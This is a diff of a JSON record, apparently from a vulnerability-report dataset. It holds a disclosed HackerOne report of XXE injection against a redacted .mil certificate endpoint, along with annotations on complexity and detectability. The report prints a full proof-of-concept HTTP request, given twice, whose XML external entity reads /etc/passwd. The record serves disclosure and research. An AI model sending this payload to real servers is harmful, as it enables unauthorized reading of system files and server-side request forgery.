@@ -1,42 +1,46 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "maskedpersian ",
-    "title": "XML External Entity (XXE) Injection",
-    "content": "\nXML External Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an external entity. When the XML parser is improperly configured to process external entities, it can allow an attacker to:\nRead arbitrary files on the server.\nPerform server-side request forgery (SSRF).\nConduct denial-of-service (DoS) attacks.\nExecute remote code (in rare cases).\nHost name: \u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil\nPOC:\nCode 931 Bytes\n1POST /ca/rest/certrequests HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"Windows\"\n6Upgrade-Insecure-Requests: 1\n7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n9Sec-Fetch-Site: same-origin\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-Dest: frame\n12Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ca/ee/ca/\n13Accept-Encoding: gzip, deflate\n14Accept-Language: en-US,en;q=0.9,fa;q=0.8\n15Priority: u=0, i\n16Connection: close\n17Content-Type: application/xml\n18Content-Length: 194\n19\n20<!--?xml version=\"2.0\" ?-->\n21<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n22<CertEnrollmentRequest>\n23  <Attributes/>\n24  <ProfileID>&ent;</ProfileID>\n25</CertEnrollmentRequest>\nImpact\nExploitation of this vulnerability can lead to:\n1-Confidentiality Breach: Unauthorized access to sensitive information stored on the server.\n2-Integrity Violation: Potential manipulation or corruption of application data.\n3-Availability Disruption: Possible denial-of-service conditions due to resource exhaustion or application crashes.\n4-Remote Code Execution: In extreme cases, execution of arbitrary commands on the server.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nCode 932 Bytes\n1POST /ca/rest/certrequests HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\n3Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"Windows\"\n6Upgrade-Insecure-Requests: 1\n7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n9Sec-Fetch-Site: same-origin\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-Dest: frame\n12Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ca/ee/ca/\n13Accept-Encoding: gzip, deflate\n14Accept-Language: en-US,en;q=0.9,fa;q=0.8\n15Priority: u=0, i\n16Connection: close\n17Content-Type: application/xml\n18Content-Length: 194\n19\n20<!--?xml version=\"2.0\" ?-->\n21<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n22<CertEnrollmentRequest>\n23  <Attributes/>\n24  <ProfileID>&ent;</ProfileID>\n25</CertEnrollmentRequest>\nSuggested Mitigation/Remediation Actions\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "maskedpersian ",
+  "title": "XML External Entity (XXE) Injection",
+  "content": "\nXML External Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an external entity. When the XML parser is improperly configured to process external entities, it can allow an attacker to:\nRead arbitrary files on the server.\nPerform server-side request forgery (SSRF).\nConduct denial-of-service (DoS) attacks.\nExecute remote code (in rare cases).\nHost name: \u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil\nPOC:\nCode 931 Bytes\n1POST /ca/rest/certrequests HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"Windows\"\n6Upgrade-Insecure-Requests: 1\n7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n9Sec-Fetch-Site: same-origin\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-Dest: frame\n12Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ca/ee/ca/\n13Accept-Encoding: gzip, deflate\n14Accept-Language: en-US,en;q=0.9,fa;q=0.8\n15Priority: u=0, i\n16Connection: close\n17Content-Type: application/xml\n18Content-Length: 194\n19\n20<!--?xml version=\"2.0\" ?-->\n21<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n22<CertEnrollmentRequest>\n23  <Attributes/>\n24  <ProfileID>&ent;</ProfileID>\n25</CertEnrollmentRequest>\nImpact\nExploitation of this vulnerability can lead to:\n1-Confidentiality Breach: Unauthorized access to sensitive information stored on the server.\n2-Integrity Violation: Potential manipulation or corruption of application data.\n3-Availability Disruption: Possible denial-of-service conditions due to resource exhaustion or application crashes.\n4-Remote Code Execution: In extreme cases, execution of arbitrary commands on the server.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nCode 932 Bytes\n1POST /ca/rest/certrequests HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\n3Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"Windows\"\n6Upgrade-Insecure-Requests: 1\n7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n9Sec-Fetch-Site: same-origin\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-Dest: frame\n12Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ca/ee/ca/\n13Accept-Encoding: gzip, deflate\n14Accept-Language: en-US,en;q=0.9,fa;q=0.8\n15Priority: u=0, i\n16Connection: close\n17Content-Type: application/xml\n18Content-Length: 194\n19\n20<!--?xml version=\"2.0\" ?-->\n21<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n22<CertEnrollmentRequest>\n23  <Attributes/>\n24  <ProfileID>&ent;</ProfileID>\n25</CertEnrollmentRequest>\nSuggested Mitigation/Remediation Actions\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "XML External Entities (XXE)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1721414460,
+  "report_url": "https://hackerone.com/reports/2573567",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Send a POST request to /ca/rest/certrequests with an XML payload containing an external entity reference to a sensitive file (e.g., file:///etc/passwd)."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "XML External Entities (XXE)"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1721414460,
-    "report_url": "https://hackerone.com/reports/2573567",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Send a POST request to /ca/rest/certrequests with an XML payload containing an external entity reference to a sensitive file (e.g., file:///etc/passwd)."
-        ],
-        [
-            2,
-            "Observe the server's response to see if it includes the contents of the referenced file, indicating successful XXE exploitation."
-        ]
-    ],
-    "vuln_description": "XML External Entity (XXE) injection vulnerability allows an attacker to read arbitrary files on the server, perform SSRF, conduct DoS attacks, or potentially execute remote code by exploiting improperly configured XML parsers that process external entities.",
-    "reason": "The attack involves a single, straightforward component (crafting an XML payload with an external entity reference) and does not require complex interactions or state manipulation. XXE is a well-known vulnerability with common exploitation patterns.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The XXE vulnerability involves XML parsing and external entity references, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to XXE vulnerabilities.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Observe the server's response to see if it includes the contents of the referenced file, indicating successful XXE exploitation."
+    ]
+  ],
+  "vuln_description": "XML External Entity (XXE) injection vulnerability allows an attacker to read arbitrary files on the server, perform SSRF, conduct DoS attacks, or potentially execute remote code by exploiting improperly configured XML parsers that process external entities.",
+  "reason": "The attack involves a single, straightforward component (crafting an XML payload with an external entity reference) and does not require complex interactions or state manipulation. XXE is a well-known vulnerability with common exploitation patterns.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XXE vulnerability involves parsing XML input with external entities, which is not directly related to authentication or authorization bypass. The methodology described focuses on detecting IDOR and AuthN/AuthZ bypass vulnerabilities by manipulating user sessions, actions, and resource IDs within the same application. Since XXE is a different class of vulnerability (input validation/parsing issue), it would not be detectable using the described methodology.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The XXE vulnerability was triggered via a POST request with an XML payload containing an external entity reference. The methodology's 'simple payload' approach could detect this because:\n1. The vulnerable parameter (ProfileID in XML) would be identified during parameter extraction\n2. A basic XXE payload (file:///etc/passwd) is considered a 'simple' payload per the methodology\n3. The response would show the file contents directly in the HTTP response (same-channel detection)\n4. No custom filter bypass was required in the POC payload",
+    "is_simple_injection": true
+  }
 }
